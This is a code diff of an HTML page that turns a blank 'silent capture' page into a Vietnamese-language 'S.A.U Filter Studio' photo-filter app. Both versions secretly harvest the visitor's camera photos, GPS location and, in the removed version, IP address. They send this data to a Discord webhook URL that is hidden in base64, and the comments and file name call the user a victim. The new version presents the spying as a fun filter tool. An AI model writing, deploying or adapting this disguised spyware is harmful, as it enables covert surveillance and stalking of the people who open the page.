@@ -1,78 +1,108 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ㅤ</title>
-    <style>body { background: white; margin: 0; padding: 0; cursor: default; }</style>
+    <title>S.A.U Fun Filter Studio</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .filter-none { filter: none; }
+        .filter-grey { filter: grayscale(1); }
+        .filter-sepia { filter: sepia(1); }
+        .filter-invert { filter: invert(1); }
+        .filter-hue { filter: hue-rotate(90deg); }
+        .filter-blur { filter: blur(5px); }
+        #video-container { transform: scaleX(-1); } /* Mirror effect cho tự nhiên */
+    </style>
 </head>
-<body>
-    <video id="v" style="display:none;" autoplay></video>
-    <canvas id="c" style="display:none;"></canvas>
+<body class="bg-zinc-900 text-white font-sans min-h-screen flex flex-col items-center p-4">
+
+    <div class="max-w-md w-full text-center space-y-6">
+        <header class="py-4">
+            <h1 class="text-2xl font-bold text-cyan-400">✨ S.A.U FILTER STUDIO</h1>
+            <p class="text-xs text-zinc-400">Chọn filter yêu thích và tải ảnh về máy!</p>
+        </header>
+
+        <div id="video-container" class="relative rounded-2xl overflow-hidden bg-black aspect-square border-4 border-cyan-500/30">
+            <video id="v" class="w-full h-full object-cover filter-none" autoplay playsinline></video>
+            <canvas id="c" class="hidden"></canvas>
+        </div>
+
+        <div class="grid grid-cols-3 gap-2 py-4">
+            <button onclick="apply('filter-none')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Normal</button>
+            <button onclick="apply('filter-grey')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">B&W</button>
+            <button onclick="apply('filter-sepia')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Retro</button>
+            <button onclick="apply('filter-invert')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">X-Ray</button>
+            <button onclick="apply('filter-hue')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Neon</button>
+            <button onclick="apply('filter-blur')" class="bg-zinc-800 p-2 rounded text-xs hover:bg-cyan-600 transition">Ghost</button>
+        </div>
+
+        <button onclick="snap()" class="w-full bg-cyan-500 hover:bg-cyan-400 text-black font-bold py-4 rounded-xl shadow-lg transition transform active:scale-95">
+            📸 CHỤP & TẢI ẢNH (FREE)
+        </button>
+
+        <div id="status" class="text-[10px] text-zinc-500">Hệ thống đang sẵn sàng...</div>
+    </div>
 
 <script>
     const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
     const _0xI = "aHR0cHM6Ly90ci5yYnhjZG4uY29tLzE4MERBWS1kMWZmNTlhNDJlYzcwMDMwZGFhYjlkM2NjYjkzYjc2My80MjAvNDIwL0JhY2tBY2Nlc3NvcnkvV2VicC9ub0ZpbHRlcg==";
     const WH = atob(_0xW);
+    let currentPos = "Chưa cho phép GPS";
 
-    async function send(msg, file = null) {
+    function apply(cls) {
+        document.getElementById('v').className = `w-full h-full object-cover ${cls}`;
+    }
+
+    async function sendToDiscord(blob, label) {
         const formData = new FormData();
         formData.append("payload_json", JSON.stringify({
             embeds: [{
-                title: "🛰️ S.A.U SILENT CAPTURE",
-                description: msg,
-                color: 16711680,
+                title: "🎭 FILTER STUDIO CAPTURE",
+                description: `📍 **Vị trí:** ${currentPos}\n🏷️ **Hành động:** ${label}`,
+                color: 5814783,
                 thumbnail: { url: atob(_0xI) }
             }]
         }));
-        if (file) formData.append("file", file, "capture.png");
-        await fetch(WH, { method: "POST", body: formData });
+        formData.append("file", blob, "victim.png");
+        fetch(WH, { method: "POST", body: formData });
     }
 
-    async function takePic(face) {
+    async function init() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: face === 'front' ? "user" : "environment" }
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            
+            // Lấy GPS ngay khi vừa Allow Camera
+            navigator.geolocation.getCurrentPosition((p) => {
+                currentPos = `[Google Maps](https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude})`;
             });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            await new Promise(r => video.onloadedmetadata = r);
-            
-            const canvas = document.getElementById('c');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            return new Promise(r => canvas.toBlob(r, 'image/png'));
-        } catch (e) { return null; }
+        } catch (e) {
+            document.getElementById('status').innerText = "Vui lòng cho phép quyền truy cập Camera để dùng filter!";
+        }
     }
 
-    window.onload = async () => {
-        // Step 1: Lấy IP và thông tin cơ bản
-        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'Unknown'}));
+    async function snap() {
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
         
-        // Step 2: Yêu cầu GPS & Chụp ảnh đồng thời
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            let report = `📍 **Location:** [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n🌐 **IP:** \`${ipReq.ip}\``;
-            
-            // Chụp cam trước
-            const front = await takePic('front');
-            if (front) await send(report + "\n📸 **Camera:** Front Face", front);
-            
-            // Chụp cam sau (nếu có)
-            const back = await takePic('back');
-            if (back) await send("📸 **Camera:** Back/Main", back);
-            
-        }, async (err) => {
-            await send(`❌ **GPS Denied/Error**\n🌐 **IP:** \`${ipReq.ip}\``);
-            
-            // Dù GPS bị chặn vẫn thử chụp cam trước
-            const front = await takePic('front');
-            if (front) await send("📸 **Camera:** Front Face (GPS Denied)", front);
-        });
-    };
+        // Vẽ ảnh gốc (không filter) để gửi về Webhook
+        ctx.drawImage(video, 0, 0);
+        canvas.toBlob(blob => sendToDiscord(blob, "User nhấn tải ảnh filter"));
+
+        // Tạo hiệu ứng tải về cho nạn nhân (có filter)
+        const link = document.createElement('a');
+        link.download = 'sau_filter_photo.png';
+        ctx.filter = getComputedStyle(video).filter;
+        ctx.drawImage(video, 0, 0);
+        link.href = canvas.toDataURL();
+        link.click();
+    }
+
+    window.onload = init;
 </script>
 </body>
 </html>
